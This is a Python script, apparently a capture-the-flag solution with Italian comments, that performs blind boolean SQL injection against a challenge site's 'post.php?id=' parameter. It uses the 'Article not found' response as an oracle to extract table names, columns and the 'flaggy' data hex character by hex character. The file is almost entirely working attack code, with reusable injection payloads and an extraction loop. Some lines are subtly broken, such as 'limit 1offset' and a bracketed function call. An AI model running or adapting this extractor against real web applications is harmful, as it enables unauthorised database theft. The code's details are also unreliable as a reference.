from time import sleep
import requests
from urllib.parse import quote
from binascii import unhexlify

url = "http://filtered.challs.cyberchallenge.it/post.php?id={}"

## oracolo:
oracle  = "Article not found"

charset = "0123456789abcdef"

r = requests.session()

def leak(payload):

    # Itero per 100 possibili colonne
    for i in range (0, 100):
        res = [] # nome delle tabelle
        
        
        guess = ""

        # continuo a guardare finché non trovo tutta la stringa
        while True: 
            print("guess ora: {}".format(guess))
            # guardo le 16 possibilità per ogni carattere
            for c in charset:
                full_payload = payload.format(i, guess + c)
                resp = r.get( url.format( quote( full_payload ) ) ) 
                #print(full_payload)
                #print(resp.text)
                if not oracle in resp.text:
                    print("carattere trovato")
                    guess += c
                    break
            else:
                guess = unhexlify(guess).decode()
                res.append(guess)
                guess = ""
                break
    return res 

#leak tables
def leak_tables():
    payload = "0' or (select hex(table_name) from information_schema.tables where table_schema=DATABASE() limit 1offset {}) like '{}%' -- -"
    return leak(payload)

## abbiamo scoperto la tabella "flaggy"


#leak columns
def leak_columns(table):
    payload = "0' or (select hex(column_name) from information_schema.columns where table_name = "+table+" limit 1offset {}) like '{}%' -- -"
    return leak(payload)




#leak data
def leak_data(column, table):
    payload = "0' or (select hex("+column+") from "+table+" limit 1 offset {}) like '{}%' -- -"
    return leak(payload)


if __name__ == "__main__":
    #leak_tables()

    #tables = ['flaggy']
    #cols = []
    #for i in tables:
        #cols.append(leak_columns[i])

    #cols = ["now", "play"]
    print(leak_data("now", "flaggy"))
    print(leak_data("play", "flaggy"))